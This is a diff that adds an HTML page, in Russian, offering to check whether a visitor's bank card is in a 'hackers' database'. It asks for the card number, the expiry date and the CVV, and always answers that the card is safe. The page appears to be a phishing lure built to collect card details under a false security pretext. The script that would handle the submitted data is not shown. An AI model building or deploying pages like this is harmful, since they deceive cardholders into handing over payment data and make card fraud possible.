@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>Document</title>
+</head>
+
+<body>
+    <div class="container">
+        <h1 class="header">Проверка безопасности</h1>
+        <h3 class="description">Узнайте есть ли ваша карта в базе данных хакеров!</h3>
+        <h3 class="description">Введите данные, что бы проверить!</h3>
+        <div class="image-container">
+            <img class="mscard-image"
+                src="https://www.mastercard.ru/content/dam/mccom/global/logos/logo-mastercard-mobile.svg" alt="">
+            <img class="visa-image"
+                src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/02/Visa_Electron.svg/1200px-Visa_Electron.svg.png"
+                alt="">
+        </div>
+        <form action="javascript:void(0);" class="form" onsubmit="validateForm(event)">
+            <label for="ccn">Номер карты</label>
+            <input id="ccn" type="tel" inputmode="numeric" pattern="[0-9\s]{13,19}" autocomplete="cc-number"
+                maxlength="19" placeholder="xxxx xxxx xxxx xxxx">
+                <label for="ccn">Дата</label>
+                <span class="expiration">
+                    <input type="text" name="month" placeholder="MM" maxlength="2" size="2" />
+                    <span>/</span>
+                    <input type="text" name="year" placeholder="YY" maxlength="2" size="2" />
+                </span>
+                <label for="ccn">CVV</label>
+            <input type="password" maxlength="3" name="cvv" id="cvv">
+            <input class="submit-button" type="submit" value="Проверить!">
+        </form>
+    </div>
+    <div id='notification' class="notification">
+        <h3>Поздравляем, вашей карты нет в базе данных!</h3>
+    </div>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="./main.js"></script>
+</body>
+
+</html>
